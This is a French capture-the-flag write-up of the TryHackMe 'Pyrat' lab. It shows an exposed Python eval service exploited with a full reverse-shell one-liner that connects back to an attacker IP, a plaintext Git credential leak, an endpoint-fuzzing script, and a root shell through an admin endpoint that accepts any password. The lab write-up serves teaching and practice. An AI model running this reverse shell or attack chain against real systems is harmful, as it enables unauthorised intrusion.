# THM — Pyrat · Linux · Easy

**IP :** `10.129.146.247` &nbsp;|&nbsp; **Date :** 10 Avril 2026 &nbsp;|&nbsp; **Outils :** nmap · netcat · Python · ssh

---

## Contexte

> Pyrat expose un service Python custom sur le port 8000 qui évalue directement les données envues comme du code Python — un REPL exposé sur le réseau. L'accès initial s'obtient en envoyant un reverse shell Python directement au socket. L'escalade passe par des credentials Git hardcodés dans `/opt/dev/.git/config`, puis par la découverte de l'endpoint `admin` du service qui donne un shell root sans authentification réelle.

---

## Reconnaissance

### Scan de ports

```bash
nmap -A 10.129.146.247
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```

Le fingerprint nmap du port 8000 est révélateur — les réponses aux sondes HTTP sont des erreurs Python :

```
name 'GET' is not defined
name 'OPTIONS' is not defined
invalid syntax (<string>, line 1)
```

Ce n'est pas un serveur HTTP. C'est un **interpréteur Python** qui évalue les données reçues comme des expressions Python. Tout ce qui est envoyé est passé à `eval()` ou `exec()`.

---

## Exploitation — Python REPL exposé (accès initial)

### Reverse shell via le socket

Le service évalue directement le code Python reçu. On envoie une one-liner de reverse shell :

```bash
# Listener
nc -lvnp 4444
```

```bash
# Connexion au service et envoi du payload
nc 10.129.146.247 8000
```

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.143.173",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])
```

Le code est évalué côté serveur, la connexion arrive sur le listener :

```
connect to [192.168.143.173] from (UNKNOWN) [10.129.146.247] 54472
$ 
```

### Stabilisation du shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

Shell obtenu en tant que `www-data`.

---

## Post-exploitation — Credentials dans le dépôt Git

### Exploration de /opt

```bash
ls -la /opt
# drwxrwxr-x  3 think think  /opt/dev
```

Le répertoire `/opt/dev` appartient à `think` et est accessible en lecture. Il ne contient pas de fichiers visibles, mais un dossier `.git`.

### Credentials hardcodés dans .git/config

```bash
cat /opt/dev/.git/config
```

```ini
[user]
    name = Jose Mario
    email = josemlwdf@github.com

[credential "https://github.com"]
    username = think
    password = _TH1NKINGPirate$_
```

Le mot de passe GitHub de `think` est stocké en clair dans la config Git locale.

### Connexion SSH

```bash
ssh think@10.129.146.247
# Password: _TH1NKINGPirate$_

cat ~/user.txt
# THM{user_flag}
```

---

## Analyse du service — Source code via Git

### Historique du dépôt

```bash
git log --oneline
# 0a3c36d (HEAD -> master) Added shell endpoint

git show HEAD --name-only
# pyrat.py.old
```

### Récupération du source

```bash
git restore --source=HEAD pyrat.py.old
cat pyrat.py.old
```

```python
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        uid = os.getuid()
        if (uid == 0):
            change_uid()          # Rétrograde si déjà root

        if data == 'shell':
            shell(client_socket)  # Spawn /bin/sh
        else:
            exec_python(client_socket, data)  # Évalue le code

def shell(client_socket):
    import pty
    os.dup2(client_socket.fileno(), 0)
    os.dup2(client_socket.fileno(), 1)
    os.dup2(client_socket.fileno(), 2)
    pty.spawn("/bin/sh")
```

Le service route les données reçues : si c'est `shell`, il spawn un `/bin/sh` ; sinon, il évalue le contenu Python. Il existe aussi un endpoint `some_endpoint` non documenté. La logique `change_uid()` s'applique seulement si le processus **tourne déjà en root** — ce qui suggère qu'il existe un chemin pour le déclencher en root.

---

## Escalade de privilèges — Endpoint admin

### Fuzzing des endpoints

On écrit un script Python pour tester les mots-clés possibles contre le socket :

```python
# fuzz_endpoint.py
import socket

endpoints = ["some_endpoint", "admin", "shell", "root", ...]

for endpoint in endpoints:
    s = socket.socket()
    s.connect(("10.129.146.247", 8000))
    s.sendall((endpoint + "\n").encode())
    response = s.recv(1024).decode(errors='ignore').strip()
    print(f"[+] {endpoint} → {response[:80]}")
    s.close()
```

```bash
python3 fuzz_endpoint.py
```

```
[+] admin   → Password:       ← répond différemment
[+] shell   → $               ← spawn shell direct
```

L'endpoint `admin` demande un mot de passe — comportement distinct de tous les autres.

### Test du mot de passe admin

```bash
nc 10.129.146.247 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# whoami
root
# cat /root/root.txt
THM{root_flag}
```

L'endpoint `admin` accepte **n'importe quel mot de passe** — la vérification n'est pas implémentée ou toujours vraie. Une fois "admin" authentifié, la commande `shell` spawn un shell en tant que root (le processus tourne en root, et `change_uid()` n'est pas déclenché sur ce chemin).

---

## Flags

```
user.txt  →  THM{user_flag}
root.txt  →  THM{root_flag}
```

---

## Chaîne d'attaque

| Phase | Technique | Outil | Détail |
|---|---|---|---|
| Reconnaissance | Port scan + fingerprint | nmap | Port 8000 = REPL Python exposé |
| Accès initial | Code injection via socket TCP | netcat | Reverse shell Python envoyé au REPL |
| Post-exploit | Credential leak dans `.git/config` | cat | Password GitHub de `think` en clair |
| Accès user | SSH | ssh | `think:_TH1NKINGPirate$_` |
| Analyse | Récupération du source via Git | git restore | Logique du service comprise |
| Escalade | Endpoint `admin` sans auth réelle | netcat + fuzz | Shell root via `admin` → `shell` |

---

## Ce que j'ai retenu

**Les fingerprints nmap contiennent parfois la réponse.** Les erreurs `name 'GET' is not defined` trahissaient immédiatement un interpréteur Python — pas besoin de fuzzing pour comprendre la surface d'attaque.

**Les fichiers `.git` laissés sur les serveurs de production sont dangereux.** La config Git contenait le mot de passe en clair. `git log` + `git show` permettent de retrouver du code supprimé. C'est une source d'information souvent négligée.

**Fuzzer les protocoles custom vaut le coup.** Le service n'était pas HTTP — un wordlist classique ne servait à rien. Un script Python sur mesure envoyant des mots-clés sur le socket TCP a permis d'identifier l'endpoint `admin` en quelques secondes.

**Ne pas supposer qu'une authentification est réelle.** `Welcome Admin!!!` après `abc123` — la vérification du mot de passe n'était pas implémentée. Toujours tester avec des credentials triviaux avant de lancer un bruteforce.

---

## Ressources

- [PayloadsAllTheThings — Python Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
- [HackTricks — Leaking credentials from .git](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git)
- [PortSwigger — Code Injection](https://portswigger.net/web-security/server-side-template-injection)
